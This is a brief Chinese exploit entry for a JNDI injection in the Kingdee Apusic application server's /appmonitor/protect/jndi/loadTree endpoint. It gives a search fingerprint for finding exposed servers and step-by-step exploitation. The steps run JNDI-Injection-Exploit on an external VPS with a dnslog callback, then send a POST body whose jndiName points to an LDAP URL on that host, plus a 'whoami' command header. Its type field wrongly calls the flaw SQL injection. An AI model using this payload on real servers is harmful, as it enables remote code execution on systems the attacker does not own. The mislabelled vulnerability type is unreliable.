# 金蝶Apusic应用服务器(中间件)loadTreeJNDI注入漏洞

- **系统**：金蝶　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`app.name="Apusic 金蝶天燕 Server"`
- **请求**：`POST /appmonitor//protect/jndi/loadTree HTTP/1.1`

**请求体 / payload**
```
1. 获取dns
id0369.dnslog.cn
2. 将`JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar`上传到vps
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -A 172.245.154.22 -C "ping id0369.dnslog.cn"
3. 漏洞利用
Host:
Content-type: application/x-www-form-urlencoded
Content-Length: 32
cmd: whoami
jndiName=ldap://172.245.154.22:1389/zdsghu
4. 获取响应
```

**其他**
- 金蝶 Apusic应用服务器(中间件) loadTree JNDI注入漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 金蝶Apusic应用服务器